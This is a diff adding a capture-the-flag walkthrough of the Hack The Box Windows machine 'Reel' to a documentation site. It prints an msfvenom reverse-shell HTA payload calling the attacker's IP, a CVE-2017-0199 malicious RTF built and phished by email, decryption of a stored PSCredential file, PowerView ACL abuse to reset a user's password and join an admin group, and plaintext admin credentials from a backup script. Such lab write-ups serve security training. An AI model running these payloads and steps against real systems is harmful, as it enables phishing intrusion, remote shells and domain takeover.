@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-windows
     weight: 10
 hero: images/reel.png
-tags: ["HTB"]
+tags: ["HTB", "ftp", "cve-2017-0199", "rtf", "hta", "phishing", "ssh", "bloodhound", "powerview", "active-directory"]
 ---
 
 # Reel
@@ -289,6 +289,360 @@ PORT   STATE SERVICE
 ```
 
 ## Foothold
+- We saw a note with stating that we can send email any `rtf` format procedures which will be reviewed
+  - https://nvd.nist.gov/vuln/detail/CVE-2017-0199
+  - [PoC](https://www.exploit-db.com/exploits/41894) or [Github one]()https://github.com/bhdresh/CVE-2017-0199
+  - We have  to generate a malicious `RTF` file
+    - So when opened in vulnerable versions of Microsoft Word it will lead to code execution. 
+    - The flaw exists in how a `olelink` object makes a http(s) request, and execute `hta` code in response.
+  - Let's generate `hta` file
+    - `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.9 LPORT=6666 -f hta-psh -o payload.hta`
+```
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.9 LPORT=6666 -f hta-psh -o payload.hta
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of hta-psh file: 7385 bytes
+Saved as: payload.hta
+```
 
+- Now we need `RTF` file
+```
+└─$ python2.7 cve-2017-0199_toolkit.py -M gen -w document.rtf -u http://10.10.16.9/payload.hta -t rtf -x 0
+Generating normal RTF payload.
+
+Generated document.rtf successfully
+```
+
+- Let's send email
+  - `swaks --to nico@megabank.com --from pentest@megabank.com --header "Subject: Document Review" --body 'Sending the document for review before sending it to the clients.' --server 10.10.10.77 --attach document.rtf `
+
+![](./images/2.png)
+
+- After few minutes, we have a connection
+
+![](./images/3.png)
+
+## User #1
+- `whoami`
+```
+C:\Windows\system32>whoami
+whoami
+htb\nico
+
+C:\Windows\system32>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeShutdownPrivilege           Shut down the system           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+C:\Windows\system32>whoami /groups
+whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes                                        
+========================================== ================ ============================================== ==================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Performance Monitor Users          Alias            S-1-5-32-558                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Print Operators                    Alias            S-1-5-32-550                                   Group used for deny only                          
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Group used for deny only                          
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
+HTB\AppLocker_Test                         Group            S-1-5-21-2648318136-3688571242-2924127574-1138 Mandatory group, Enabled by default, Enabled group
+HTB\MegaBank_Users                         Group            S-1-5-21-2648318136-3688571242-2924127574-1604 Mandatory group, Enabled by default, Enabled group
+HTB\DR_Site                                Group            S-1-5-21-2648318136-3688571242-2924127574-1143 Mandatory group, Enabled by default, Enabled group
+HTB\HelpDesk_Admins                        Group            S-1-5-21-2648318136-3688571242-2924127574-1145 Mandatory group, Enabled by default, Enabled group
+HTB\Restrictions                           Group            S-1-5-21-2648318136-3688571242-2924127574-1146 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192    
+```
+
+- We have a `cred.xml` file in `Desktop`
+```
+c:\Users\nico>dir Desktop
+dir Desktop
+ Volume in drive C has no label.
+ Volume Serial Number is CEBA-B613
+
+ Directory of c:\Users\nico\Desktop
+
+28/05/2018  21:07    <DIR>          .
+28/05/2018  21:07    <DIR>          ..
+28/10/2017  00:59             1,468 cred.xml
+14/09/2023  17:05                34 user.txt
+               2 File(s)          1,502 bytes
+               2 Dir(s)   4,980,654,080 bytes free
+
+c:\Users\nico>type desktop\cred.xml
+type desktop\cred.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">HTB\Tom</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
+    </Props>
+  </Obj>
+</Objs>
+
+```
+
+- It's `PSCredential` and we can read it using `Import-CliXml`
+  - `https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#secure-string-to-plaintext`
+```
+PS c:\Users\nico> $cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *
+
+UserName       : Tom
+Password       : 1ts-mag1c!!!
+SecurePassword : System.Security.SecureString
+Domain         : HTB
+```
+
+- Let's try `ssh` to box using the new creds
+```
+└─$ ssh tom@10.10.10.77
+tom@10.10.10.77's password: 
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+tom@REEL C:\Users\tom>      
+```
+## User #2
+- `tom`'s desktop contains `AD Audit` folder with a note
+
+```
+tom@REEL C:\Users\tom\Desktop\AD Audit>dir                                                                                      
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is CEBA-B613                                                                                              
+
+ Directory of C:\Users\tom\Desktop\AD Audit                                                                                     
+
+05/29/2018  09:02 PM    <DIR>          .                                                                                        
+05/29/2018  09:02 PM    <DIR>          ..                                                                                       
+05/30/2018  12:44 AM    <DIR>          BloodHound                                                                               
+05/29/2018  09:02 PM               182 note.txt                                                                                 
+               1 File(s)            182 bytes                                                                                   
+               3 Dir(s)   4,979,994,624 bytes free                                                                              
+
+tom@REEL C:\Users\tom\Desktop\AD Audit>type note.txt                                                                            
+Findings:                                                                                                                       
+
+Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).                                  
+
+Maybe we should re-run Cypher query against other groups we've created.                                                         
+tom@REEL C:\Users\tom\Desktop\AD Audit>             
+```
+
+- We also have AD audit tools
+  - And `acls.csv` file
+```
+tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound>dir                                                                           
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is CEBA-B613                                                                                              
+
+ Directory of C:\Users\tom\Desktop\AD Audit\BloodHound                                                                          
+
+05/30/2018  12:44 AM    <DIR>          .                                                                                        
+05/30/2018  12:44 AM    <DIR>          ..                                                                                       
+05/29/2018  08:57 PM    <DIR>          Ingestors                                                                                
+10/30/2017  11:15 PM           769,587 PowerView.ps1                                                                            
+               1 File(s)        769,587 bytes                                                                                   
+               3 Dir(s)   4,979,994,624 bytes free                                                                              
+
+tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound>dir Ingestors                                                                 
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is CEBA-B613                                                                                              
+
+ Directory of C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors                                                                
+
+05/29/2018  08:57 PM    <DIR>          .                                                                                        
+05/29/2018  08:57 PM    <DIR>          ..                                                                                       
+11/17/2017  12:50 AM           112,225 acls.csv                                                                                 
+10/28/2017  09:50 PM             3,549 BloodHound.bin                                                                           
+10/24/2017  04:27 PM           246,489 BloodHound_Old.ps1                                                                       
+10/24/2017  04:27 PM           568,832 SharpHound.exe                                                                           
+10/24/2017  04:27 PM           636,959 SharpHound.ps1                                                                           
+               5 File(s)      1,568,054 bytes                                                                                   
+               2 Dir(s)   4,979,994,624 bytes free
+```
+
+- We can't run `Sharphound`
+```
+tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>.\SharpHound.exe -c All                                             
+This program is blocked by group policy. For more information, contact your system administrator.
+```
+
+- So let's download the `acls.csv`
+```
+tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>copy acls.csv \\10.10.16.9\share                                    
+        1 file(s) copied.                                                                                                       
+```
+
+![](./images/4.png)
+
+- `tom` has `WriteOwner` over `claire`
+  - `claire` has `WriteDacl` over `Backup_Admins`
+  - So let's get `claire`
+    - https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writeowner
+
+![](./images/5.png)
+
+![](./images/6.png)
+
+
+- Let's change the owner `claire` and then reset her password
+```
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> import-module .\Powerview.ps1                                                      
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -identity claire -OwnerIdentity tom                          
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> $cred = ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -force                     
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -identity claire -accountpassword $cred   
+```
+
+```
+└─$ ssh claire@10.10.10.77   
+claire@10.10.10.77's password:
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+claire@REEL C:\Users\claire> 
+```
+## User #3
+- Now as a `claire` we can add ourselves to `Backup_Admins` group due to `WriteDacl` 
+  - https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl
+```
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+claire@REEL C:\Users\claire>net group backup_admins                                                                             
+Group name     Backup_Admins                                                                                                    
+Comment                                                                                                                         
+
+Members                                                                                                                         
+
+-------------------------------------------------------------------------------                                                 
+ranj                                                                                                                            
+The command completed successfully.                                                                                             
+
+
+claire@REEL C:\Users\claire>net group backup_admins claire /add                                                                 
+The command completed successfully.                                                                                             
+
+
+claire@REEL C:\Users\claire>net group backup_admins                                                                             
+Group name     Backup_Admins                                                                                                    
+Comment                                                                                                                         
+
+Members                                                                                                                         
+
+-------------------------------------------------------------------------------                                                 
+claire                   ranj                                                                                                   
+The command completed successfully.                                                                                             
+
+
+claire@REEL C:\Users\claire>     
+```
 
 ## Root
+- Permissions over `Administrator` folder
+```
+claire@REEL c:\Users>icacls Administrator                                                                                       
+Administrator NT AUTHORITY\SYSTEM:(OI)(CI)(F)                                                                                   
+              HTB\Backup_Admins:(OI)(CI)(F)                                                                                     
+              HTB\Administrator:(OI)(CI)(F)                                                                                     
+              BUILTIN\Administrators:(OI)(CI)(F)                                                                                
+
+Successfully processed 1 files; Failed processing 0 files    
+```
+
+- But we can't read the flag
+```
+claire@REEL c:\Users\Administrator>dir Desktop                                                                                  
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is CEBA-B613                                                                                              
+
+ Directory of c:\Users\Administrator\Desktop                                                                                    
+
+01/21/2018  03:56 PM    <DIR>          .                                                                                        
+01/21/2018  03:56 PM    <DIR>          ..                                                                                       
+11/02/2017  10:47 PM    <DIR>          Backup Scripts                                                                           
+09/14/2023  05:05 PM                34 root.txt                                                                                 
+               1 File(s)             34 bytes                                                                                   
+               3 Dir(s)   4,978,888,704 bytes free                                                                                                                                                                  
+
+claire@REEL c:\Users\Administrator>type Desktop\root.txt                                                                        
+Access is denied.                                                                                                               
+
+```
+
+- Content of `Backup Scripts` folder
+```
+claire@REEL c:\Users\Administrator\Desktop\Backup Scripts>dir                                                                   
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is CEBA-B613                                                                                              
+
+ Directory of c:\Users\Administrator\Desktop\Backup Scripts                                                                     
+
+11/02/2017  10:47 PM    <DIR>          .                                                                                        
+11/02/2017  10:47 PM    <DIR>          ..                                                                                       
+11/04/2017  12:22 AM               845 backup.ps1                                                                               
+11/02/2017  10:37 PM               462 backup1.ps1                                                                              
+11/04/2017  12:21 AM             5,642 BackupScript.ps1                                                                         
+11/02/2017  10:43 PM             2,791 BackupScript.zip                                                                         
+11/04/2017  12:22 AM             1,855 folders-system-state.txt                                                                 
+11/04/2017  12:22 AM               308 test2.ps1.txt                                                                            
+               6 File(s)         11,903 bytes                                                                                   
+               2 Dir(s)   4,978,888,704 bytes free  
+```
+
+- We have creds in one of the scripts
+```
+claire@REEL c:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1                                                 
+# admin password                                                                                                                
+$password="Cr4ckMeIfYouC4n!"                                                                                                    
+
+#Variables, only Change here                                                                                                    
+$Destination="\\BACKUP03\BACKUP" #Copy the Files to this Location                                                               
+$Versions="50" #How many of the last Backups you want to keep                                                                   
+$BackupDirs="C:\Program Files\Microsoft\Exchange Server" #What Folders you want to backup                                       
+$Log="Log.txt" #Log Name                                                                                                        
+$LoggingLevel="1" #LoggingLevel only for Output in Powershell Window, 1=smart, 3=Heavy                                          
+
+#STOP-no changes from here                                                                                                      
+#STOP-no changes from here                                                                                                      
+#Settings - do not change anything from here                                                                                    
+$Backupdir=$Destination +"\Backup-"+ (Get-Date -format yyyy-MM-dd)+"-"+(Get-Random -Maximum 100000)+"\"                         
+$Items=0                                                                                                                        
+$Count=0                                                                                                                        
+$ErrorCount=0                                                                                                                   
+$StartDate=Get-Date #-format dd.MM.yyyy-HH:mm:ss                                                                                
+...
+```
+
+- Let's `ssh`
+  - `Administrator:Cr4ckMeIfYouC4n!`
+```
+└─$ ssh administrator@10.10.10.77         
+administrator@10.10.10.77's password: 
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+administrator@REEL C:\Users\Administrator> 
+```
